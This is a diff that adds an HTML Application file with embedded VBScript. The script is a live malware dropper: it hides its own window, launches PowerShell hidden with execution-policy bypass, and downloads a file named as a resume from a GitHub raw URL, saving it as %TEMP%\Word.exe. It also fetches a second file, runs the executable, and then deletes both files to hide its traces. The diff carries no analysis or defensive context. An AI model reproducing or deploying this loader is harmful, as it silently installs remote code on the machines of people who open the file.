@@ -1,0 +1,23 @@
+<html>
+<head>
+  <HTA:APPLICATION ID="oHTA"
+    APPLICATIONNAME="MSession"
+    BORDER="none"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="no"
+    SYSMENU="no"
+    VERSION="1.0"
+    WINDOWSTATE="minimize"
+   />
+</head>
+<body>
+    <script language="VBScript">
+
+	Window.ReSizeTo 0,0
+Window.MoveTo -1000, -1000
+Set wsh = CreateObject("wscript.shell")
+ wsh.Run "Powershell.exe -WindowStyle hidden -NoP -NonI -Exec Bypass; Invoke-WebRequest -Uri https://raw.githubusercontent.com/rdtsc2/junk/refs/heads/main/resume.doc -OutFile %TEMP%\Word.exe ; Invoke-WebRequest -Uri https://raw.githubusercontent.com/rdtsc2/junk/refs/heads/main/base.pk -OutFile %TEMP%\base.pk; %TEMP%\Word.exe; Start-Sleep -Seconds 5; Remove-Item %TEMP%\Word.exe;  Remove-Item %TEMP%\base.pk;"
+Window.Close
+</script>
+</body>
+</html>
